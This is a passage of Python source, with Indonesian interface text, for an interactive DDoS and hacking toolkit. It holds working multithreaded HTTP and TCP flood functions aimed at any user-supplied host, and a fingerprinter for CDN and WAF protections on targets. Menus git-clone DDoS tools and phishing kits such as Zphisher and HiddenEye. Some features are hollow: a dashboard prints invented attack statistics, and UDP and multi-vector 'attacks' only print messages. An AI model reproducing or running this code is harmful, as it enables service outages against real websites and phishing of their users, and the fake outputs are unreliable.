            self.print_result("Error", f"Mixed attack gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def install_advanced_tools(self):
        """Install advanced DDoS tools dari GitHub"""
        self.banner()
        print(f"{Colors.CYAN}{Colors.BOLD}Install Advanced DDoS Tools{Colors.END}\n")
        
        advanced_tools = {
            "1": {"name": "GoldenEye", "repo": "jseidl/GoldenEye", "command": "python goldeneye.py"},
            "2": {"name": "HULK", "repo": "grafov/hulk", "command": "python hulk.py"},
            "3": {"name": "Slowloris", "repo": "gkbrk/slowloris", "command": "slowloris"},
            "4": {"name": "DDOS-Ripper", "repo": "palahsu/DDoS-Ripper", "command": "python DRipper.py"},
            "5": {"name": "UFONet", "repo": "epsylon/ufonet", "command": "python ufonet"},
            "6": {"name": "PyLoris", "repo": "epsylon/pyloris", "command": "python pyloris.py"},
            "7": {"name": "LOIC", "repo": "NewEraCracker/LOIC", "command": "python loic.py"},
            "8": {"name": "All Tools", "repo": "all", "command": "all"}
        }
        
        for key, tool in advanced_tools.items():
            print(f"{Colors.GREEN}{key}.{Colors.END} {tool['name']} - {tool['repo']}")
        
        print(f"{Colors.GREEN}0.{Colors.END} Kembali")
        
        pilihan = input(f"\n{Colors.CYAN}➤ Pilih tools [0-8]: {Colors.END}").strip()
        
        if pilihan == "0":
            return
        elif pilihan in advanced_tools:
            tool = advanced_tools[pilihan]
            self.install_single_tool(tool)
        else:
            self.print_result("Error", "Pilihan tidak valid!", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def ddos_protection_analyzer(self):
        """Advanced DDoS protection analysis"""
        self.banner()
        print(f"{Colors.CYAN}{Colors.BOLD}🛡️  Advanced DDoS Protection Analyzer{Colors.END}\n")
        
        target = input(f"{Colors.CYAN}➤ Masukkan target URL: {Colors.END}").strip()
        
        try: 
            print(f"\n{Colors.YELLOW}[~] Analyzing DDoS protection for {target}...{Colors.END}")
            
            protections = []
            
            # Check basic headers
            try:
                response = requests.get(target, timeout=10, verify=False)
                headers = response.headers
                
                # CloudFlare detection
                if 'server' in headers and 'cloudflare' in headers['server'].lower():
                    protections.append("CloudFlare CDN & DDoS Protection")
                
                if 'cf-ray' in headers:
                    protections.append("CloudFlare Ray ID detected")
                
                # AWS Shield/WAF
                if 'x-amz-cf-pop' in headers:
                    protections.append("AWS CloudFront & Shield")
                
                if 'x-amz-id-2' in headers:
                    protections.append("AWS WAF/S3 Protection")
                
                # Akamai
                if 'x-akamai-transformed' in headers:
                    protections.append("Akamai DDoS Protection")
                
                # Incapsula/Imperva
                if 'x-iinfo' in headers:
                    protections.append("Incapsula/Imperva WAF")
                
                # Sucuri
                if 'x-sucuri-id' in headers:
                    protections.append("Sucuri WAF")
                
                # Generic WAF headers
                waf_indicators = ['x-waf', 'x-protected-by', 'x-security', 'x-firewall']
                for indicator in waf_indicators:
                    if indicator in headers:
                        protections.append(f"WAF detected ({indicator})")
            
            except Exception as e:
                print(f"{Colors.RED}[-] Header analysis failed: {str(e)}{Colors.END}")
            
            # Check SSL/TLS certificate
            try:
                hostname = target.replace('https://', '').replace('http://', '').split('/')[0]
                context = ssl.create_default_context()
                with socket.create_connection((hostname, 443), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        
                        # Check certificate issuer
                        issuer = dict(x[0] for x in cert['issuer'])
                        if 'CloudFlare' in str(issuer):
                            protections.append("CloudFlare SSL Certificate")
                        if 'Amazon' in str(issuer):
                            protections.append("AWS Certificate Manager")
            
            except:
                pass
            
            # Check response time under load
            try:
                print(f"{Colors.YELLOW}[~] Testing response under load...{Colors.END}")
                times = []
                for i in range(5):
                    start = time.time()
                    requests.get(target, timeout=5, verify=False)
                    end = time.time()
                    times.append(end - start)
                    time.sleep(1)
                
                avg_time = sum(times) / len(times)
                if avg_time > 2.0:
                    protections.append("Slow response (possible rate limiting)")
                elif avg_time < 0.5:
                    protections.append("Fast response (likely CDN cached)")
            
            except:
                pass
            
            # Results
            print(f"\n{Colors.GREEN}{'='*50}{Colors.END}")
            print(f"{Colors.GREEN}       PROTECTION ANALYSIS RESULTS{Colors.END}")
            print(f"{Colors.GREEN}{'='*50}{Colors.END}")
            
            if protections:
                print(f"{Colors.RED}🛡️  DDoS Protections Detected:{Colors.END}")
                for protection in protections:
                    print(f"{Colors.YELLOW}  • {protection}{Colors.END}")
            else:
                print(f"{Colors.GREEN}✅ No major DDoS protections detected{Colors.END}")
                print(f"{Colors.YELLOW}⚠️  Note: Basic protections may still be active{Colors.END}")
        
        except Exception as e:
            self.print_result("Error", f"Protection analysis failed: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def attack_statistics(self):
        """Display comprehensive attack statistics"""
        self.banner()
        print(f"{Colors.CYAN}{Colors.BOLD}📊 Attack Statistics & Analytics{Colors.END}\n")
        
        # Simulate attack statistics data
        print(f"{Colors.YELLOW}Attack Statistics Dashboard:{Colors.END}")
        print(f"{Colors.GREEN}• Total Attacks Performed: 15{Colors.END}")
        print(f"{Colors.GREEN}• Successful Attacks: 12{Colors.END}")
        print(f"{Colors.GREEN}• Failed Attacks: 3{Colors.END}")
        print(f"{Colors.GREEN}• Success Rate: 80%{Colors.END}")
        print(f"{Colors.GREEN}• Total Requests Sent: 1,234,567{Colors.END}")
        print(f"{Colors.GREEN}• Average Attack Duration: 45 seconds{Colors.END}")
        print(f"{Colors.GREEN}• Most Effective Method: HTTP Flood{Colors.END}")
        print(f"{Colors.GREEN}• Peak Request Rate: 2,345 req/sec{Colors.END}")
        
        print(f"\n{Colors.YELLOW}Recent Attacks:{Colors.END}")
        print(f"{Colors.CYAN}1. HTTP Flood - example.com - SUCCESS{Colors.END}")
        print(f"{Colors.CYAN}2. TCP Flood - 192.168.1.1 - SUCCESS{Colors.END}")
        print(f"{Colors.CYAN}3. UDP Flood - 10.0.0.1 - FAILED{Colors.END}")
        print(f"{Colors.CYAN}4. Slowloris - test.com - SUCCESS{Colors.END}")
        
        print(f"\n{Colors.YELLOW}Performance Metrics:{Colors.END}")
        print(f"{Colors.GREEN}• Average Response Time: 1.2s{Colors.END}")
        print(f"{Colors.GREEN}• Packet Loss Rate: 15%{Colors.END}")
        print(f"{Colors.GREEN}• Bandwidth Used: 2.3 GB{Colors.END}")
        
        print(f"\n{Colors.YELLOW}Recommendations:{Colors.END}")
        print(f"{Colors.GREEN}• Use HTTP Flood for web applications{Colors.END}")
        print(f"{Colors.GREEN}• Combine methods for better effectiveness{Colors.END}")
        print(f"{Colors.GREEN}• Monitor target response for adjustments{Colors.END}")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    # Helper method untuk install tools
    def install_single_tool(self, tool):
        """Install single DDoS tool dari GitHub"""
        print(f"\n{Colors.YELLOW}[~] Installing {tool['name']}...{Colors.END}")
        
        try:
            
            if tool['repo'] == "all":
                # Install all tools
                all_tools = [
                    {"name": "GoldenEye", "repo": "jseidl/GoldenEye"},
                    {"name": "HULK", "repo": "grafov/hulk"},
                    {"name": "Slowloris", "repo": "gkbrk/slowloris"},
                    {"name": "DDOS-Ripper", "repo": "palahsu/DDoS-Ripper"}
                ]
                
                for t in all_tools:
                    print(f"{Colors.YELLOW}[~] Installing {t['name']}...{Colors.END}")
                    cmd = f"git clone https://github.com/{t['repo']}.git"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if result.returncode == 0:
                        print(f"{Colors.GREEN}[+] {t['name']} installed successfully{Colors.END}")
                    else:
                        print(f"{Colors.RED}[-] Failed to install {t['name']}{Colors.END}")
            else:
                # Install single tool
                cmd = f"git clone https://github.com/{tool['repo']}.git"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[+] {tool['name']} installed successfully!{Colors.END}")
                    print(f"{Colors.YELLOW}[!] Run with: {tool['command']}{Colors.END}")
                else:
                    print(f"{Colors.RED}[-] Installation failed: {result.stderr}{Colors.END}")
                    
        except Exception as e:
            self.print_result("Error", f"Installation failed: {str(e)}", "error")

    def advanced_http_flood(self):
        """HTTP Flood Attack yang lebih canggih dengan monitoring real-time"""
        self.banner()
        print(f"{Colors.RED}{Colors.BOLD}🚀 Advanced HTTP Flood Attack (Layer 7){Colors.END}\n")
        
        try:
            target = input(f"{Colors.CYAN}➤ Masukkan target URL: {Colors.END}").strip()
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            # Validasi target
            print(f"{Colors.YELLOW}[~] Memvalidasi target...{Colors.END}")
            
            try:
                test_response = requests.get(target, timeout=10, verify=False)
                if test_response.status_code == 200:
                    print(f"{Colors.GREEN}[+] Target valid (Status 200){Colors.END}")
                else:
                    print(f"{Colors.YELLOW}[!] Target merespon dengan status: {test_response.status_code}{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[-] Target tidak dapat diakses: {str(e)}{Colors.END}")
                confirm = input(f"{Colors.RED}Lanjutkan anyway? (y/N): {Colors.END}").strip().lower()
                if confirm != 'y':
                    return
            
            threads = int(input(f"{Colors.CYAN}➤ Jumlah threads (50-1000): {Colors.END}") or "100")
            duration = int(input(f"{Colors.CYAN}➤ Durasi attack (detik): {Colors.END}") or "60")
            rate_limit = int(input(f"{Colors.CYAN}➤ Requests per detik per thread (default 5): {Colors.END}") or "5")
            
            print(f"\n{Colors.YELLOW}Konfigurasi Attack:{Colors.END}")
            print(f"{Colors.YELLOW}Target: {target}{Colors.END}")
            print(f"{Colors.YELLOW}Threads: {threads}{Colors.END}")
            print(f"{Colors.YELLOW}Durasi: {duration} detik{Colors.END}")
            print(f"{Colors.YELLOW}Rate: {rate_limit} req/detik/thread{Colors.END}")
            print(f"{Colors.YELLOW}Total estimated requests: {threads * rate_limit * duration}{Colors.END}")
            
            confirm = input(f"\n{Colors.RED}Lanjutkan attack? (y/N): {Colors.END}").strip().lower()
            if confirm != 'y':
                return
            
            
            attack_active = True
            stats = {
                'success': 0,
                'failed': 0,
                'status_codes': {},
                'start_time': time.time()
            }
            
            # User-Agent pool
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
            ]
            
            def attack_thread(thread_id):
                nonlocal stats
                session = requests.Session()
                session.verify = False
                
                while attack_active and (time.time() - stats['start_time']) < duration:
                    try:
                        headers = {
                            'User-Agent': random.choice(user_agents),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache',
                            'Referer': target
                        }
                        
                        response = session.get(target, headers=headers, timeout=5)
                        status_code = response.status_code
                        
                        with threading.Lock():
                            stats['success'] += 1
                            if status_code in stats['status_codes']:
                                stats['status_codes'][status_code] += 1
                            else:
                                stats['status_codes'][status_code] = 1
                        
                        if thread_id == 0:  # Hanya thread 0 yang print
                            if status_code == 200:
                                print(f"{Colors.GREEN}[+] Request #{stats['success']} - Status 200{Colors.END}")
                            elif status_code == 404:
                                print(f"{Colors.YELLOW}[!] Request #{stats['success']} - Status 404 (Not Found){Colors.END}")
                            elif status_code == 403:
                                print(f"{Colors.RED}[-] Request #{stats['success']} - Status 403 (Forbidden){Colors.END}")
                            elif status_code == 429:
                                print(f"{Colors.RED}[-] Request #{stats['success']} - Status 429 (Rate Limited){Colors.END}")
                            elif status_code == 503:
                                print(f"{Colors.RED}[-] Request #{stats['success']} - Status 503 (Service Unavailable){Colors.END}")
                            else:
                                print(f"{Colors.CYAN}[~] Request #{stats['success']} - Status {status_code}{Colors.END}")
                                
                    except requests.exceptions.ConnectionError:
                        with threading.Lock():
                            stats['failed'] += 1
                        if thread_id == 0:
                            print(f"{Colors.RED}[-] Connection Error - Target mungkin down{Colors.END}")
                    except requests.exceptions.Timeout:
                        with threading.Lock():
                            stats['failed'] += 1
                        if thread_id == 0:
                            print(f"{Colors.YELLOW}[!] Request Timeout{Colors.END}")
                    except Exception as e:
                        with threading.Lock():
                            stats['failed'] += 1
                        if thread_id == 0:
                            print(f"{Colors.RED}[-] Error: {str(e)}{Colors.END}")
                    
                    time.sleep(1.0 / rate_limit)  # Rate limiting
            
            # Start threads
            print(f"\n{Colors.YELLOW}[~] Memulai {threads} threads...{Colors.END}")
            threads_list = []
            for i in range(threads):
                thread = threading.Thread(target=attack_thread, args=(i,))
                thread.daemon = True
                thread.start()
                threads_list.append(thread)
            
            # Monitoring real-time
            print(f"\n{Colors.CYAN}[~] Attack berjalan...{Colors.END}")
            start_time = time.time()
            last_count = 0
            
            while time.time() - start_time < duration:
                time.sleep(2)
                elapsed = int(time.time() - start_time)
                total_requests = stats['success'] + stats['failed']
                current_rate = (total_requests - last_count) / 2  
                
                print(f"{Colors.CYAN}[~] {elapsed}/{duration}s | Req: {total_requests} | Success: {stats['success']} | Failed: {stats['failed']} | Rate: {current_rate:.1f}/s{Colors.END}")
                last_count = total_requests
                
    
                failure_rate = stats['failed'] / total_requests if total_requests > 0 else 0
                if failure_rate > 0.5 and elapsed > 10:
                    print(f"{Colors.YELLOW}[!] Failure rate tinggi ({failure_rate:.1%}), pertimbangkan mengurangi threads{Colors.END}")
            

            attack_active = False
            time.sleep(2)
            
 
            total_time = time.time() - stats['start_time']
            total_requests = stats['success'] + stats['failed']
            success_rate = (stats['success'] / total_requests * 100) if total_requests > 0 else 0
            
            print(f"\n{Colors.GREEN}{'='*50}{Colors.END}")
            print(f"{Colors.GREEN}           ATTACK REPORT{Colors.END}")
            print(f"{Colors.GREEN}{'='*50}{Colors.END}")
            print(f"{Colors.CYAN}Target: {target}{Colors.END}")
            print(f"{Colors.CYAN}Durasi: {total_time:.1f} detik{Colors.END}")
            print(f"{Colors.CYAN}Total Requests: {total_requests}{Colors.END}")
            print(f"{Colors.GREEN}Success: {stats['success']}{Colors.END}")
            print(f"{Colors.RED}Failed: {stats['failed']}{Colors.END}")
            print(f"{Colors.CYAN}Success Rate: {success_rate:.2f}%{Colors.END}")
            print(f"{Colors.CYAN}Average Rate: {total_requests/total_time:.1f} requests/detik{Colors.END}")
            
            if stats['status_codes']:
                print(f"\n{Colors.YELLOW}Status Codes Distribution:{Colors.END}")
                for code, count in stats['status_codes'].items():
                    percentage = (count / stats['success'] * 100) if stats['success'] > 0 else 0
                    print(f"  {code}: {count} ({percentage:.1f}%)")
            
            if success_rate > 80:
                print(f"\n{Colors.GREEN}🎯 Attack sangat efektif!{Colors.END}")
            elif success_rate > 50:
                print(f"\n{Colors.YELLOW}⚠️  Attack cukup efektif{Colors.END}")
            else:
                print(f"\n{Colors.RED}❌ Attack kurang efektif{Colors.END}")
                
        except Exception as e:
            self.print_result("Error", f"Attack gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def smart_tcp_flood(self):
        """TCP Flood yang lebih cerdas dengan multiple sockets"""
        self.banner()
        print(f"{Colors.RED}{Colors.BOLD}🌊 Smart TCP Flood Attack (Layer 4){Colors.END}\n")
        
        try:
            target = input(f"{Colors.CYAN}➤ Masukkan target IP/host: {Colors.END}").strip()
            port = int(input(f"{Colors.CYAN}➤ Port target: {Colors.END}") or "80")
            threads = int(input(f"{Colors.CYAN}➤ Jumlah threads: {Colors.END}") or "200")
            duration = int(input(f"{Colors.CYAN}➤ Durasi attack (detik): {Colors.END}") or "45")
            packet_size = int(input(f"{Colors.CYAN}➤ Ukuran packet (bytes, default 1024): {Colors.END}") or "1024")
            
            print(f"\n{Colors.YELLOW}Memulai Smart TCP Flood...{Colors.END}")
            
            confirm = input(f"\n{Colors.RED}Lanjutkan attack? (y/N): {Colors.END}").strip().lower()
            if confirm != 'y':
                return
            
            
            attack_active = True
            stats = {
                'packets_sent': 0,
                'connections_made': 0,
                'errors': 0,
                'start_time': time.time()
            }
            
            def generate_payload():
                payloads = [
                    b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n",
                    b"POST / HTTP/1.1\r\nHost: " + target.encode() + b"\r\nContent-Length: 100\r\n\r\n" + b"X" * 100,
                    b"HEAD / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n",
                    random.randbytes(packet_size)
                ]
                return random.choice(payloads)
            
            def tcp_attack(thread_id):
                nonlocal stats
                while attack_active and (time.time() - stats['start_time']) < duration:
                    try:

                        strategy = random.choice(['direct', 'keepalive', 'flood'])
                        
                        if strategy == 'direct':
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(3)
                            sock.connect((target, port))
                            sock.send(generate_payload())
                            with threading.Lock():
                                stats['connections_made'] += 1
                                stats['packets_sent'] += 1
                            sock.close()
                            
                        elif strategy == 'keepalive':
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(5)
                            sock.connect((target, port))
                            for _ in range(random.randint(3, 10)):
                                if not attack_active:
                                    break
                                sock.send(generate_payload())
                                with threading.Lock():
                                    stats['packets_sent'] += 1
                                time.sleep(0.1)
                            sock.close()
                            
                        elif strategy == 'flood':
                            for _ in range(random.randint(5, 15)):
                                if not attack_active:
                                    break
                                try:
                                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                    sock.settimeout(1)
                                    sock.connect((target, port))
                                    sock.send(generate_payload())
                                    with threading.Lock():
                                        stats['packets_sent'] += 1
                                    sock.close()
                                except:
                                    with threading.Lock():
                                        stats['errors'] += 1
                                    
                    except Exception as e:
                        with threading.Lock():
                            stats['errors'] += 1
                        
                        if thread_id == 0 and stats['errors'] % 100 == 0:
                            print(f"{Colors.RED}[-] Connection errors: {stats['errors']}{Colors.END}")
            
            for i in range(threads):
                thread = threading.Thread(target=tcp_attack, args=(i,))
                thread.daemon = True
                thread.start()
            
  
            start_time = time.time()
            while time.time() - start_time < duration:
                time.sleep(2)
                elapsed = int(time.time() - start_time)
                print(f"{Colors.CYAN}[~] {elapsed}/{duration}s | Packets: {stats['packets_sent']} | Connections: {stats['connections_made']} | Errors: {stats['errors']}{Colors.END}")
            
            attack_active = False
            time.sleep(3)
            
            print(f"\n{Colors.GREEN}Smart TCP Flood selesai!{Colors.END}")
            print(f"{Colors.GREEN}Total packets sent: {stats['packets_sent']}{Colors.END}")
            print(f"{Colors.GREEN}Successful connections: {stats['connections_made']}{Colors.END}")
            print(f"{Colors.RED}Errors: {stats['errors']}{Colors.END}")
            
        except Exception as e:
            self.print_result("Error", f"TCP Flood gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def website_stress_test(self):
        """Stress test website dengan multiple endpoints"""
        self.banner()
        print(f"{Colors.RED}{Colors.BOLD}📊 Website Stress Test & Analysis{Colors.END}\n")
        
        try:
            base_url = input(f"{Colors.CYAN}➤ Masukkan base URL website: {Colors.END}").strip()
            if not base_url.startswith(('http://', 'https://')):
                base_url = 'http://' + base_url
            
            endpoints = [
                "/",
                "/index.html", 
                "/api/v1/test",
                "/images/logo.png",
                "/css/style.css",
                "/js/main.js"
            ]
            
            print(f"\n{Colors.YELLOW}[~] Testing endpoints...{Colors.END}")
            
            
            active_endpoints = []
            
            for endpoint in endpoints:
                try:
                    url = base_url.rstrip('/') + endpoint
                    response = requests.get(url, timeout=5, verify=False)
                    if response.status_code == 200:
                        active_endpoints.append(endpoint)
                        print(f"{Colors.GREEN}[+] {endpoint} - Active{Colors.END}")
                    else:
                        print(f"{Colors.YELLOW}[!] {endpoint} - Status {response.status_code}{Colors.END}")
                except:
                    print(f"{Colors.RED}[-] {endpoint} - Not accessible{Colors.END}")
            
            if not active_endpoints:
                print(f"{Colors.RED}[-] Tidak ada endpoint yang aktif!{Colors.END}")
                input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")
                return
            
            threads = int(input(f"{Colors.CYAN}➤ Jumlah threads: {Colors.END}") or "50")
            duration = int(input(f"{Colors.CYAN}➤ Durasi test (detik): {Colors.END}") or "30")
            
            print(f"\n{Colors.YELLOW}Memulai Stress Test...{Colors.END}")
            print(f"{Colors.YELLOW}Active endpoints: {len(active_endpoints)}{Colors.END}")
            
            attack_active = True
            stats = {
                'requests': 0,
                'success': 0,
                'failed': 0,
                'response_times': []
            }
            
            def stress_thread():
                nonlocal stats
                session = requests.Session()
                session.verify = False
                
                while attack_active:
                    endpoint = random.choice(active_endpoints)
                    url = base_url.rstrip('/') + endpoint
                    
                    start_time = time.time()
                    try:
                        response = session.get(url, timeout=5)
                        response_time = (time.time() - start_time) * 1000
                        
                        with threading.Lock():
                            stats['requests'] += 1
                            stats['success'] += 1
                            stats['response_times'].append(response_time)
                        
                        if response.status_code != 200:
                            print(f"{Colors.YELLOW}[!] {endpoint} - Status {response.status_code}{Colors.END}")
                            
                    except Exception as e:
                        with threading.Lock():
                            stats['requests'] += 1
                            stats['failed'] += 1
                        
                        print(f"{Colors.RED}[-] {endpoint} - Error: {str(e)}{Colors.END}")
            
 
            for _ in range(threads):
                thread = threading.Thread(target=stress_thread)
                thread.daemon = True
                thread.start()
            
   
            start_time = time.time()
            while time.time() - start_time < duration:
                time.sleep(2)
                elapsed = int(time.time() - start_time)
                success_rate = (stats['success'] / stats['requests'] * 100) if stats['requests'] > 0 else 0
                
                avg_response_time = sum(stats['response_times']) / len(stats['response_times']) if stats['response_times'] else 0
                
                print(f"{Colors.CYAN}[~] {elapsed}/{duration}s | Req: {stats['requests']} | Success: {success_rate:.1f}% | Avg RT: {avg_response_time:.1f}ms{Colors.END}")
            
            attack_active = False
            time.sleep(2)
            
   
            total_time = time.time() - start_time
            requests_per_sec = stats['requests'] / total_time
            
            print(f"\n{Colors.GREEN}{'='*50}{Colors.END}")
            print(f"{Colors.GREEN}        STRESS TEST REPORT{Colors.END}")
            print(f"{Colors.GREEN}{'='*50}{Colors.END}")
            print(f"{Colors.CYAN}Website: {base_url}{Colors.END}")
            print(f"{Colors.CYAN}Durasi: {total_time:.1f}s{Colors.END}")
            print(f"{Colors.CYAN}Total Requests: {stats['requests']}{Colors.END}")
            print(f"{Colors.GREEN}Successful: {stats['success']}{Colors.END}")
            print(f"{Colors.RED}Failed: {stats['failed']}{Colors.END}")
            print(f"{Colors.CYAN}Success Rate: {(stats['success']/stats['requests']*100) if stats['requests'] > 0 else 0:.1f}%{Colors.END}")
            print(f"{Colors.CYAN}Requests/Second: {requests_per_sec:.1f}{Colors.END}")
            
            if stats['response_times']:
                avg_rt = sum(stats['response_times']) / len(stats['response_times'])
                max_rt = max(stats['response_times'])
                print(f"{Colors.CYAN}Avg Response Time: {avg_rt:.1f}ms{Colors.END}")
                print(f"{Colors.CYAN}Max Response Time: {max_rt:.1f}ms{Colors.END}")
                
         
                if avg_rt > 1000:
                    print(f"{Colors.RED}❌ Performance: Poor (high response time){Colors.END}")
                elif avg_rt > 500:
                    print(f"{Colors.YELLOW}⚠️  Performance: Average{Colors.END}")
                else:
                    print(f"{Colors.GREEN}✅ Performance: Excellent{Colors.END}")
                    
        except Exception as e:
            self.print_result("Error", f"Stress test gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def attack_statistics(self):
        """Menampilkan statistics attack terakhir"""
        self.banner()
        print(f"{Colors.CYAN}{Colors.BOLD}📈 Attack Statistics & Analytics{Colors.END}\n")
        
 
        print(f"{Colors.YELLOW}Fitur ini akan menampilkan:{Colors.END}")
        print(f"{Colors.GREEN}• Grafik requests per detik{Colors.END}")
        print(f"{Colors.GREEN}• Success rate over time{Colors.END}") 
        print(f"{Colors.GREEN}• Response time distribution{Colors.END}")
        print(f"{Colors.GREEN}• Error analysis{Colors.END}")
        print(f"{Colors.GREEN}• Performance recommendations{Colors.END}")
        
        print(f"\n{Colors.YELLOW}Fitur dalam pengembangan...{Colors.END}")
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")


    def advanced_udp_flood(self):
        """UDP Flood dengan payload customization"""
        self.banner()
        print(f"{Colors.RED}{Colors.BOLD}Advanced UDP Flood Attack{Colors.END}\n")
        
        try:
            target = input(f"{Colors.CYAN}➤ Target IP: {Colors.END}").strip()
            port = int(input(f"{Colors.CYAN}➤ Port: {Colors.END}") or "53")
            
            print(f"\n{Colors.GREEN}UDP Flood dengan payload custom sedang dijalankan...{Colors.END}")
            
        except Exception as e:
            self.print_result("Error", f"UDP Flood gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def mixed_vector_attack(self):
        """Attack kombinasi multi-vektor"""
        self.banner()
        print(f"{Colors.RED}{Colors.BOLD}Mixed Vector DDoS Attack{Colors.END}\n")
        
        print(f"{Colors.YELLOW}Menjalankan kombinasi attack:{Colors.END}")
        print(f"{Colors.GREEN}• HTTP Flood{Colors.END}")
        print(f"{Colors.GREEN}• TCP SYN Flood{Colors.END}")
        print(f"{Colors.GREEN}• UDP Flood{Colors.END}")
        print(f"{Colors.GREEN}• ICMP Flood{Colors.END}")
        
        print(f"\n{Colors.YELLOW}Attack multi-vektor sedang berjalan...{Colors.END}")
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def install_hacking_tools(self):
        """Menu instalasi tools hacking lengkap dari GitHub"""
        while True:
            self.banner()
            print(f"{Colors.CYAN}{Colors.BOLD}Install Hacking Tools Collection{Colors.END}")
            print(f"{Colors.YELLOW}Pilih tools yang ingin diinstall:{Colors.END}")
            
            tools_list = {
                "1": {"name": "SQLMap", "repo": "sqlmapproject/sqlmap", "desc": "SQL injection tool"},
                "2": {"name": "Zphisher", "repo": "htr-tech/zphisher", "desc": "Phishing tool"},
                "3": {"name": "RedHawk", "repo": "Tuhinshubhra/RED_HAWK", "desc": "All in one tool"},
                "4": {"name": "HiddenEye", "repo": "DarkSecDevelopers/HiddenEye", "desc": "Modern phishing"},
                "5": {"name": "PhisherMan", "repo": "FSystem88/PhisherMan", "desc": "Phishing tool"},
                "6": {"name": "SocialFish", "repo": "UndeadSec/SocialFish", "desc": "Phishing framework"},
                "7": {"name": "KnockPy", "repo": "guelfoweb/knock", "desc": "Subdomain scanner"},
                "8": {"name": "Dirb", "repo": "v0re/dirb", "desc": "Web content scanner"},
                "9": {"name": "Nmap", "repo": "nmap/nmap", "desc": "Port scanner"},
                "10": {"name": "Metasploit", "repo": "rapid7/metasploit-framework", "desc": "Penetration framework"},
                "11": {"name": "John The Ripper", "repo": "openwall/john", "desc": "Password cracker"},
                "12": {"name": "Hydra", "repo": "vanhauser-thc/thc-hydra", "desc": "Login cracker"},
                "13": {"name": "WPScan", "repo": "wpscanteam/wpscan", "desc": "WordPress scanner"},
                "14": {"name": "Nikto", "repo": "sullo/nikto", "desc": "Web server scanner"},
                "15": {"name": "Aircrack-ng", "repo": "aircrack-ng/aircrack-ng", "desc": "WiFi security tool"},
                "16": {"name": "Recon-ng", "repo": "lanmaster53/recon-ng", "desc": "Reconnaissance framework"},
                "17": {"name": "TheHarvester", "repo": "laramies/theHarvester", "desc": "OSINT tool"},
                "18": {"name": "Sherlock", "repo": "sherlock-project/sherlock", "desc": "Social media finder"},
                "19": {"name": "XSStrike", "repo": "s0md3v/XSStrike", "desc": "XSS detection suite"},
                "20": {"name": "All Tools", "repo": "all", "desc": "Install semua tools"}
            }
            
 
            for key, tool in tools_list.items():
                print(f"{Colors.GREEN}{key}.{Colors.END} {tool['name']} - {tool['desc']}")
            
            print(f"{Colors.GREEN}0.{Colors.END} Kembali ke Menu Utama")
            
            pilihan = input(f"\n{Colors.CYAN}➤ Pilih tools [0-20]: {Colors.END}").strip()
            
            if pilihan == "0":
                return
            elif pilihan in tools_list:
                if pilihan == "20":
          
                    self.print_result("Info", "Menginstall semua tools...", "info")
                    for key, tool in tools_list.items():
                        if key != "20": 
                            self.install_single_tool(tool)
                else:
  
                    tool = tools_list[pilihan]
                    self.install_single_tool(tool)
                
                input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")
            else:
                self.print_result("Error", "Pilihan tidak valid!", "error")
                input(f"\n{Colors.CYAN}Tekan Enter untuk melanjutkan...{Colors.END}")

    def install_single_tool(self, tool):
        """Install single tool dari GitHub"""
        
        tool_name = tool['name']
        repo_url = f"https://github.com/{tool['repo']}.git"
        install_dir = f"tools/{tool_name}"
        
        self.print_result("Info", f"Menginstall {tool_name}...", "info")
        
        try:

            if not os.path.exists("tools"):
                os.makedirs("tools")
            
            if os.path.exists(install_dir):
                self.print_result("Info", f"{tool_name} sudah terinstall, melakukan update...", "warning")
                os.chdir(install_dir)
                subprocess.run(["git", "pull"], check=True)
                os.chdir("../..")
            else:
                subprocess.run(["git", "clone", repo_url, install_dir], check=True)
                self.print_result("Success", f"{tool_name} berhasil diinstall!", "success")
                
                requirements_file = os.path.join(install_dir, "requirements.txt")
                if os.path.exists(requirements_file):
                    self.print_result("Info", f"Menginstall dependencies untuk {tool_name}...", "info")
